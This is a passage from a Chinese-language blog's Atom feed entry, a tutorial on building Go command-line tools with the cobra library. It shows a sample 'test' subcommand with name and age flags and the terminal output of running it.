class="comment">// See the License for the specific language governing permissions and</span></div><div class="line"><span class="comment">// limitations under the License.</span></div><div class="line"></div><div class="line"><span class="keyword">package</span> cmd</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/spf13/cobra"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">var</span> name <span class="keyword">string</span></div><div class="line"><span class="keyword">var</span> age <span class="keyword">int</span></div><div class="line"></div><div class="line"><span class="comment">// testCmd represents the test command</span></div><div class="line"><span class="keyword">var</span> testCmd = &amp;cobra.Command&#123;</div><div class="line">	Use:   <span class="string">"test"</span>,</div><div class="line">	Short: <span class="string">"A brief description of your command"</span>,</div><div class="line">	Long: <span class="string">`A longer description that spans multiple lines and likely contains examples</span></div><div class="line">and usage of using your command. For example:</div><div class="line"></div><div class="line">Cobra is a CLI library for Go that empowers applications.</div><div class="line">This application is a tool to generate the needed files</div><div class="line">to quickly create a Cobra application.`,</div><div class="line">	Run: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">		<span class="comment">// <span class="doctag">TODO:</span> Work your own magic here</span></div><div class="line">		fmt.Printf(<span class="string">"My name is %s, my age is %d\n"</span>, name, age)</div><div class="line">	&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</div><div class="line">	RootCmd.AddCommand(testCmd)</div><div class="line"></div><div class="line">	<span class="comment">// Here you will define your flags and configuration settings.</span></div><div class="line"></div><div class="line">	<span class="comment">// Cobra supports Persistent Flags which will work for this command</span></div><div class="line">	<span class="comment">// and all subcommands, e.g.:</span></div><div class="line">	<span class="comment">// testCmd.PersistentFlags().String("foo", "", "A help for foo")</span></div><div class="line"></div><div class="line">	<span class="comment">// Cobra supports local flags which will only run when this command</span></div><div class="line">	<span class="comment">// is called directly, e.g.:</span></div><div class="line">	testCmd.Flags().StringVarP(&amp;name, <span class="string">"name"</span>, <span class="string">"n"</span>, <span class="string">""</span>, <span class="string">"persion's name"</span>)</div><div class="line">	testCmd.Flags().IntVarP(&amp;age, <span class="string">"age"</span>, <span class="string">"a"</span>, <span class="number">0</span>, <span class="string">"person's age"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后测试下是不是我们想要的效果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp$ go run main.go -h</div><div class="line">A longer description that spans multiple lines and likely contains</div><div class="line">examples and usage of using your application. For example:</div><div class="line"></div><div class="line">Cobra is a CLI library <span class="keyword">for</span> Go that empowers applications.</div><div class="line">This application is a tool to generate the needed files</div><div class="line">to quickly create a Cobra application.</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo [<span class="built_in">command</span>]</div><div class="line"></div><div class="line">Available Commands:</div><div class="line">  <span class="built_in">test</span>        A brief description of your <span class="built_in">command</span></div><div class="line"></div><div class="line">Flags:</div><div class="line">      --config string   config file (default is <span class="variable">$HOME</span>/.demo.yaml)</div><div class="line">  -t, --toggle          Help message <span class="keyword">for</span> toggle</div><div class="line"></div><div class="line">Use <span class="string">"demo [command] --help"</span> <span class="keyword">for</span> more information about a command.</div><div class="line"></div><div class="line">maojun@maojun-mbp$ go run main.go <span class="built_in">test</span> -h</div><div class="line">A longer description that spans multiple lines and likely contains examples</div><div class="line">and usage of using your command. For example:</div><div class="line"></div><div class="line">Cobra is a CLI library <span class="keyword">for</span> Go that empowers applications.</div><div class="line">This application is a tool to generate the needed files</div><div class="line">to quickly create a Cobra application.</div><div class="line"></div><div class="line">Usage:</div><div class="line">  demo <span class="built_in">test</span> [flags]</div><div class="line"></div><div class="line">Flags:</div><div class="line">  <span class="_">-a</span>, --age int       person<span class="string">'s age</span></div><div class="line">  -n, --name string   persion's name</div><div class="line"></div><div class="line">Global Flags:</div><div class="line">      --config string   config file (default is <span class="variable">$HOME</span>/.demo.yaml)</div><div class="line"></div><div class="line"> maojun@maojun-mbp$ go run main.go <span class="built_in">test</span> <span class="_">-a</span> 10 -n <span class="built_in">test</span></div><div class="line">My name is <span class="built_in">test</span>, my age is 10</div></pre></td></tr></table></figure>
<p>命令行补全，man这些可以自己手动测试</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无论是Openstack还是Docker都有一个漂亮的命令行工具，Openstack的命令行工具主要使用的是Python的argparse库，至于Docker的CLI的实现还没看，但是今天看到了一个在Golang中 用于构建像Docker命令行风格的一个库:cobra&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="cobra" scheme="https://blog.yumaojun.net/tags/cobra/"/>
    
  </entry>
  
</feed>
